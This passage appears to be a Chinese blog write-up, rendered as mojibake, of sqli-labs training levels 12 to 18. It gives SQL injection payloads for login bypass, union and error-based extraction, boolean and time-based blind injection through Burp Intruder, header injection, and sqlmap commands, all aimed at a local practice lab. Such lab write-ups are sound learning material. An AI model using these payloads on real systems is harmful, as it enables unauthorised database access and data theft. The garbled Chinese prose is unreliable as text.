that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>æˆ‘ï¼Ÿï¼Ÿï¼Ÿ</p>\n<p>ç”Ÿæ°”çš„ä¹±æäº†:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&quot;5678+or+1%3D1+--+&amp;passwd=1234&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;5678 or 1=1 -- &quot;) and password=(&quot;1234&quot;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>è¿™ä¸‹å‡ºæ¥äº†æŠŠï¼Œåé¢æ˜¯ &quot;)ï¼Œå†åŠ ä¸ªæ‹¬å·é—­åˆä¸€ä¸‹ä¸‹ï¼Œåˆ†åˆ« order by2 å’Œ 3ï¼Œç¡®å®šæ˜¯ä¸¤ä¸ªå­—æ®µ</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin123455&quot;)+order by 3--+&amp;passwd=1234&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºå½“å‰æ•°æ®åº“ï½</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin123455&quot;)+union select 1,database()--+&amp;passwd=1234&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:security&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>åç»­æ“ä½œå‚è€ƒ less-11</p>\n<h2 id=\"æ€»ç»“-12\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-12\">#</a> æ€»ç»“</h2>\n<p>å’Œä¸Šä¸€å…³æ¯”å°±æ˜¯å•å¼•å·é—­åˆå˜æˆ &quot;) é—­åˆäº†ï¼Œå’Œå‰é¢åå…³åšçš„é¢˜ç›®ä¸€æ ·å‘€ï¼Œåé¢ä¸ä¼šè¿˜æ˜¯ä¸€æ ·çš„å§ï¼Œç„¶åå†™å®Œç›²æ³¨å°±æ²¡äº†æŠŠ</p>\n<p>å”‰ï¼Œæˆ‘è§‰å¾—æˆ‘çš„ä¸“æ³¨åŠ›æœ‰ç‚¹ä¸å¤ªå¤Ÿï¼Œæ‰å†™äº†å‡ é“é¢˜å•Šï¼Œè¿˜èŠ±äº†è¿™ä¹ˆé•¿æ—¶é—´ï¼ŒçœŸæ˜¯åºŸç‰©</p>\n<hr>\n<h1 id=\"less-13\"><a class=\"markdownIt-Anchor\" href=\"#less-13\">#</a> Less-13</h1>\n<p>dateï¼š2020-11-21 18:08:01</p>\n<h2 id=\"è¿‡ç¨‹-13\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-13\">#</a> è¿‡ç¨‹</h2>\n<h3 id=\"sqlmap-13\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-13\">#</a> sqlmap</h3>\n<p>åŒ less-11</p>\n<h3 id=\"æ‰‹å·¥æ³¨å…¥-13\"><a class=\"markdownIt-Anchor\" href=\"#æ‰‹å·¥æ³¨å…¥-13\">#</a> æ‰‹å·¥æ³¨å…¥</h3>\n<p>ç›²çŒœè¿™é¢˜æ˜¯ ')) é—­åˆï¼Œpayloadï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin%27%29%29+or+1%3D1+--+23&amp;passwd=32&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;) or 1=1 -- 23&#x27;) and password=(&#x27;32&#x27;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>å“¦è±ï¼Œæ˜¯ ') é—­åˆï¼Œç”Ÿæ°”ï¼é—­åˆï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27;) or 1=1+--+23&amp;passwd=32&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºåªæœ‰ä¸€å¼ å›¾ç‰‡ï¼Œè¡¨ç¤ºé—­åˆæˆåŠŸï¼Œæ²¡æœ‰æ•°æ®å›æ˜¾</p>\n<p>é‚£å°±ç”¨æŠ¥é”™æ¥çœ‹æ•°æ®å‘—ï¼Œæ­£å¥½æŠ¥é”™æ³¨å…¥çš„å‡½æ•°æˆ‘ç”¨çš„å°‘</p>\n<p>extractvalue (ç›®æ ‡ xml æ–‡æ¡£ï¼Œxml è·¯å¾„) ç”¨äºæŸ¥è¯¢ xml æ–‡ä»¶</p>\n<p>ç¬¬äºŒä¸ªå‚æ•° xml ä¸­çš„ä½ç½®æ˜¯å¯æ“ä½œçš„åœ°æ–¹ï¼Œxml æ–‡æ¡£ä¸­æŸ¥æ‰¾å­—ç¬¦ä½ç½®æ˜¯ç”¨ /xxx/xxx/xxx/â€¦ è¿™ç§æ ¼å¼ï¼Œå¦‚æœæˆ‘ä»¬å†™å…¥å…¶ä»–æ ¼å¼ï¼Œå°±ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”ä¼šè¿”å›æˆ‘ä»¬å†™å…¥çš„éæ³•æ ¼å¼å†…å®¹ï¼Œè€Œè¿™ä¸ªéæ³•çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬æƒ³è¦æŸ¥è¯¢çš„å†…å®¹</p>\n<p>payloadï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27;) and extractvalue(1,concat(&#x27;~&#x27;,database()))+--+23&amp;passwd=32&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºå¾—åˆ°å½“å‰æ•°æ®åº“åï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">XPATH syntax error: &#x27;~security</span><br></pre></td></tr></table></figure>\n<p>æ‹¿åˆ«çš„æ•°æ®åœ¨ xml è·¯å¾„é‚£é‡Œæ”¹ payload å³å¯ï¼Œå‚è€ƒ less-11</p>\n<h2 id=\"æ€»ç»“-13\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-13\">#</a> æ€»ç»“</h2>\n<p><a href=\"https://www.cnblogs.com/wocalieshenmegui/p/5917967.html\">åç§ sql æŠ¥é”™æ³¨å…¥å§¿åŠ¿æ€»ç»“</a></p>\n<hr>\n<h1 id=\"less-14\"><a class=\"markdownIt-Anchor\" href=\"#less-14\">#</a> Less-14</h1>\n<p>dateï¼š2020-11-21 19:47:21</p>\n<h2 id=\"è¿‡ç¨‹-14\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-14\">#</a> è¿‡ç¨‹</h2>\n<h3 id=\"sqlmap-14\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-14\">#</a> sqlmap</h3>\n<p>åŒ less-11</p>\n<h3 id=\"æ‰‹å·¥æ³¨å…¥-14\"><a class=\"markdownIt-Anchor\" href=\"#æ‰‹å·¥æ³¨å…¥-14\">#</a> æ‰‹å·¥æ³¨å…¥</h3>\n<p>ç›´æ¥åŒå¼•å·é—­åˆäº†ï¼Œpayloadï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&quot; order by 666+--+&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Unknown column &#x27;666&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>\n<p>èƒ½é—­åˆäº†å°±éšä¾¿ç”¨ä¹‹å‰çš„å“ªä¸ªæ–¹æ³•æ‹¿æ•°æ®éƒ½å¯ä»¥å•¦ï¼Œç”¨æŠ¥é”™æ³¨å…¥æ‹¿ä¸ªæ•°æ®åº“åï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&quot; and extractvalue(1,concat(&#x27;~&#x27;,database()))+--+&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">XPATH syntax error: &#x27;~security&#x27;</span><br></pre></td></tr></table></figure>\n<p>åˆ«çš„åŒ Less-11</p>\n<h2 id=\"æ€»ç»“-14\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-14\">#</a> æ€»ç»“</h2>\n<p>è¿™ï¼Œæ²¡å•¥</p>\n<hr>\n<h1 id=\"less-15\"><a class=\"markdownIt-Anchor\" href=\"#less-15\">#</a> Less-15</h1>\n<p>dateï¼š2020-11-21 20:03:27</p>\n<h2 id=\"è¿‡ç¨‹-15\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-15\">#</a> è¿‡ç¨‹</h2>\n<h3 id=\"sqlmap-15\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-15\">#</a> sqlmap</h3>\n<p>åŒ less-11</p>\n<h3 id=\"æ‰‹å·¥æ³¨å…¥-15\"><a class=\"markdownIt-Anchor\" href=\"#æ‰‹å·¥æ³¨å…¥-15\">#</a> æ‰‹å·¥æ³¨å…¥</h3>\n<p>çœ‹æ ‡é¢˜ï¼Œå¸ƒå°”ç›²æ³¨ï¼Œè¡Œå­ï¼Œä¸Š bp æŠ“åŒ…</p>\n<p>å•å¼•å·é—­åˆåæ¥ order by 2ï¼Œç»™çš„æ˜¯ flag.jpg</p>\n<p>æ¥ order by 2ï¼Œç»™çš„æ˜¯ slap.jpg</p>\n<p>æ˜æ˜¾ flag.jpg çš„å°±æ˜¯ç™»é™†æˆåŠŸå˜›</p>\n<p>è¯´æ˜å•å¼•å·é—­åˆæˆåŠŸä¸”éœ€è¦çš„æ˜¯ä¸¤ä¸ªå­—æ®µï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27; order by 3+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>è¿˜æ˜¯å…ˆåˆ©ç”¨ if åˆ¤æ–­ï¼ŒæŠŠæ•°æ®åº“åå­—é•¿åº¦æå‡ºæ¥ï¼Œåˆ©ç”¨ä¸€ä¸‹ payloadï¼ŒæœåŠ¡å™¨æ²‰ç¡äº†å¥½ä¸€ä¼šæ‰é†’æ¥ï¼Œé‚£ä¹ˆé•¿åº¦å°±æ˜¯ 8 å•¦ï¼</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27; and if( length(database())=8,sleep(23),1 )+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>ä¸€ä¸ªä¸€ä¸ªå­—ç¬¦çŒœï¼Œè¿™ç§æ¬ç –çš„æ´»è¿˜æ˜¯äº¤ç»™ bp æŠŠ</p>\n<p>å³é”® send to Intruderï¼Œattack type é€‰ cluster bomb:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-15/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-15/Content-Type: application/x-www-form-urlencodedContent-Length: 81Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&#x27; and if( ascii(substr(database(),Â§1Â§,1))=Â§8Â§,sleep(23),1 )+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>ç¬¬ä¸€ä¸ªå‚æ•°ä» 1-8ï¼Œç¬¬äºŒä¸ªå‚æ•°ä» 1-127ï¼Œæœ€åæ ¹æ® ascii å€¼æŠŠæ•°æ®åº“åæ‹–å‡ºæ¥ï¼Œçˆ†å­—æ®µå‚è€ƒ less-11</p>\n<table>\n<thead>\n<tr>\n<th>request</th>\n<th>payload1</th>\n<th>payload2</th>\n<th>status</th>\n<th>timeout</th>\n<th>error</th>\n<th>length</th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>787</td>\n<td>3</td>\n<td>99</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>802</td>\n<td>2</td>\n<td>101</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>838</td>\n<td>6</td>\n<td>105</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>909</td>\n<td>5</td>\n<td>114</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>913</td>\n<td>1</td>\n<td>115</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>927</td>\n<td>7</td>\n<td>116</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>932</td>\n<td>4</td>\n<td>117</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>968</td>\n<td>8</td>\n<td>121</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>0</td>\n<td></td>\n<td></td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1737</td>\n<td></td>\n</tr>\n<tr>\n<td>2</td>\n<td>2</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1737</td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1737</td>\n<td></td>\n</tr>\n<tr>\n<td>3</td>\n<td>3</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1737</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"æ€»ç»“-15\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-15\">#</a> æ€»ç»“</h2>\n<hr>\n<h1 id=\"less-16\"><a class=\"markdownIt-Anchor\" href=\"#less-16\">#</a> Less-16</h1>\n<p>dateï¼š2020-11-21 22:33:47</p>\n<h2 id=\"è¿‡ç¨‹-16\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-16\">#</a> è¿‡ç¨‹</h2>\n<h3 id=\"sqlmap-16\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-16\">#</a> sqlmap</h3>\n<p>åŒ less-11</p>\n<h3 id=\"æ‰‹å·¥æ³¨å…¥-16\"><a class=\"markdownIt-Anchor\" href=\"#æ‰‹å·¥æ³¨å…¥-16\">#</a> æ‰‹å·¥æ³¨å…¥</h3>\n<p>username è¾“å…¥ <code>admin&quot;) or 1=1 -- </code> ç›´æ¥ç™»å½•æˆåŠŸï¼Œä¸è¦å¿˜è®°â€“åé¢çš„ç©ºæ ¼å“ˆ</p>\n<p>å› ä¸ºå¯ä»¥æ ¹æ®å›¾ç‰‡çš„æ˜¾ç¤ºåˆ¤æ–­ï¼Œæ‰€ä»¥å…¶å®æ—¶é—´ç›²æ³¨è¿˜æ˜¯å¸ƒå°”ç›²æ³¨éƒ½æ˜¯å¯ä»¥çš„å‘€ï¼Œåªæ˜¯å‰é¢é‚£é“é¢˜ç”¨è¿‡å¸ƒå°”ç›²æ³¨äº†ï¼Œè¿™é‡Œå°±ç”¨æ—¶é—´ç›²æ³¨</p>\n<p>è€è§„çŸ©å…ˆåˆ¤æ–­æ•°æ®åº“é•¿åº¦æ˜¯ 8ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin&quot;) and length(database())=8 -- </span><br></pre></td></tr></table></figure>\n<p>ç„¶åæ¬ç –æ‰¾ bpï¼Œsend to Intruderï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-16/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-16/Content-Type: application/x-www-form-urlencodedContent-Length: 78Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheunameadmin&quot;) and if(ascii(substr(database(),Â§1Â§,1))=Â§8Â§,slepp(23),1)--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>ç¬¬ä¸€ä¸ªå‚æ•°ä» 1-8ï¼Œç¬¬äºŒä¸ªå‚æ•°ä» 1-127ï¼Œæœ€åæ ¹æ® ascii å€¼æŠŠæ•°æ®åº“åæ‹–å‡ºæ¥ï¼Œçˆ†å­—æ®µå‚è€ƒ less-11</p>\n<table>\n<thead>\n<tr>\n<th>request</th>\n<th>payload1</th>\n<th>payload2</th>\n<th>status</th>\n<th>timeout</th>\n<th>error</th>\n<th>length</th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>787</td>\n<td>3</td>\n<td>99</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>802</td>\n<td>2</td>\n<td>101</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>838</td>\n<td>6</td>\n<td>105</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>909</td>\n<td>5</td>\n<td>114</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>913</td>\n<td>1</td>\n<td>115</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>927</td>\n<td>7</td>\n<td>116</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>932</td>\n<td>4</td>\n<td>117</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>968</td>\n<td>8</td>\n<td>121</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1712</td>\n<td></td>\n</tr>\n<tr>\n<td>0</td>\n<td></td>\n<td></td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1749</td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1749</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"æ€»ç»“-16\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-16\">#</a> æ€»ç»“</h2>\n<p>bp çœŸå¥½ï¼Œsqlmap çœŸå¥½ï¼Œæ¬ç –çœŸéš¾</p>\n<hr>\n<h1 id=\"less-17sqlmaping\"><a class=\"markdownIt-Anchor\" href=\"#less-17sqlmaping\">#</a> Less-17ï¼ˆsqlmapingï¼‰</h1>\n<p>dateï¼š2020-11-21 22:54:56</p>\n<h2 id=\"è¿‡ç¨‹-17\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-17\">#</a> è¿‡ç¨‹</h2>\n<p>çœ‹è§é¢˜ç›®åˆå¼€å¿ƒäº†èµ·æ¥ï¼Œä¸æ˜¯ç›²æ³¨å•¦</p>\n<h3 id=\"sqlmap-17\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-17\">#</a> sqlmap</h3>\n<p>bp æŠ“åŒ…å³é”® copy to file ç”Ÿæˆ 17.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -r 17.txt --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>åç»­åŒ less-11</p>\n<h3 id=\"æ‰‹å·¥æ³¨å…¥-17\"><a class=\"markdownIt-Anchor\" href=\"#æ‰‹å·¥æ³¨å…¥-17\">#</a> æ‰‹å·¥æ³¨å…¥</h3>\n<p>username è¾“å…¥ <code>admin' or 1=1 -- </code></p>\n<p>ç«Ÿç„¶è¿”å› bug offï¼Œyou silly dump hacker</p>\n<p>å“¦è±ï¼Œéª‚æˆ‘ï¼Œæˆ‘è¦å¹²ä½ ï¼Œç­‰ç€</p>\n<p>æˆ‘æ€€ç–‘åå°åˆ¤æ–­äº†ç”¨æˆ·è¾“å…¥ï¼Œç„¶åæ— æ•°æ¬¡å°è¯•æ— æ•°æ¬¡è¢«éª‚ï¼Œæˆ‘å†³å®šå·å·çœ‹ä¸€ä¸‹æºç </p>\n<p>æºç ä¸­å¯¹ uname é™åˆ¶äº†åªèƒ½ 15 ä¸ªå­—ç¬¦ï¼Œå•æ˜¯è¿™ä¸ªå°±å·²ç»å¾ˆæ— åŠ›äº†ï¼Œåæ¥çœ‹å®Œæºç æ‰å‘ç°è¿™æ˜¯ä¸€ä¸ªé‡ç½®å¯†ç çš„è¡¨å•ï¼Œè€Œä¸”æºç ä¸­å¹¶æ²¡æœ‰å¯¹ passwd åšé™åˆ¶</p>\n<p>çœ¼ççš„æˆ‘å†³å®šç”¨æ—¶é—´ç›²æ³¨ï¼Œbp send to repeaterï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&amp;passwd=1&#x27; where 1=1 and if( length(database())=8,sleep(10),1 )--+&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>å“ˆå“ˆ æœåŠ¡å™¨ç¡ç€å•¦ï¼Œéšåæ—¶é—´ç›²æ³¨å°±å¯ä»¥äº†ï¼Œå’Œä¸Šé¢çš„é¢˜ç›®ä¸€æ ·</p>\n<h2 id=\"æ€»ç»“-17\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-17\">#</a> æ€»ç»“</h2>\n<p>æ„Ÿè§‰ç”¨å¾—å¤šçš„è¿˜æ˜¯ç›²æ³¨</p>\n<p>ç›²æ³¨æ‰‹å·¥æ³¨å…¥æœ€å¿«å°±æ˜¯ç”¨äºŒåˆ†æ³•ï¼Œä½†æ˜¯æˆ‘æ˜¯æœ‰ bp çš„äººï¼</p>\n<ol>\n<li>â€“risk=RISK é£é™©ï¼ˆ1-4ï¼Œé»˜è®¤ 1ï¼‰å‡é«˜é£é™©ç­‰çº§ä¼šå¢åŠ æ•°æ®è¢«ç¯¡æ”¹çš„é£é™©ã€‚risk 2ï¼šåŸºäºäº‹ä»¶çš„æµ‹è¯•ï¼›risk 3ï¼šor è¯­å¥çš„æµ‹è¯•ï¼›risk 4ï¼šupdate çš„æµ‹è¯•</li>\n</ol>\n<hr>\n<h1 id=\"less-18\"><a class=\"markdownIt-Anchor\" href=\"#less-18\">#</a> Less-18</h1>\n<p>dateï¼š2020-11-22 00:19:07</p>\n<h2 id=\"è¿‡ç¨‹-18\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-18\">#</a> è¿‡ç¨‹</h2>\n<p>é¢˜ç›®æç¤ºï¼ŒYour IP ADDRESS is: 127.0.0.1ï¼Œè¿™é¢˜æˆ‘ä¼šï¼è‚¯å®šæ˜¯ xff å¤´æ³¨å…¥ï¼ï¼ˆç»“æœä¸æ˜¯ï¼‰</p>\n<h3 id=\"sqlmap-18\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-18\">#</a> sqlmap</h3>\n<p>bp æŠ“åŒ…å³é”® copy to file ç”Ÿæˆ 18.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -r 18.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>åç»­åŒ less-11</p>\n<h3 id=\"æ‰‹å·¥æ³¨å…¥-18\"><a class=\"markdownIt-Anchor\" href=\"#æ‰‹å·¥æ³¨å…¥-18\">#</a> æ‰‹å·¥æ³¨å…¥</h3>\n<p>æ—¢ç„¶ä¸æ˜¯ xff å¤´ï¼Œé‚£å°±çœ‹ä¸€ä¸‹æºç æŠŠ</p>\n<p>æºç ä¸­å¯¹è´¦æˆ·å¯†ç è¿›è¡Œäº†åˆ¤æ–­ï¼Œå¿…é¡»è¦ç»•è¿‡å»æ‰èƒ½è¿›è¡Œå¤´æ³¨å…¥ï¼Œåˆšå¥½ä¸Šä¸€é¢˜é‡ç½®äº†å¯†ç </p>\n<p>é‚£ä¹ˆå°±è¾“å…¥ç›¸åº”çš„è´¦æˆ·å¯†ç ï¼Œå†åœ¨ user-agent ä¸Šæ³¨å…¥å°±å¥½å•¦ï¼Œå…ˆæ¥ä¸ªå•å¼•å·æŠ¥é”™ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-18/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&#x27;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-18/Content-Type: application/x-www-form-urlencodedContent-Length: 34Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your IP ADDRESS is: 127.0.0.1&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&lt;/font&gt;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;Your User Agent is: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&#x27;&lt;/font&gt;&lt;br&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;127.0.0.1&#x27;, &#x27;admin&#x27;)&#x27; at line 1&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>è®²é“ç†è¿™é‡Œè‚¯å®šæ˜¯æ’å…¥æ“ä½œï¼Œé‚£å°±æ˜¯ insert æ³¨å…¥å’¯ï¼Œæºç ç¡®å®æ˜¯ insertï¼Œå…¶å®ä¸ç®¡æ˜¯ä»€ä¹ˆæ³¨å…¥ï¼Œåªè¦èƒ½å¤§æ¦‚å¼„ sql 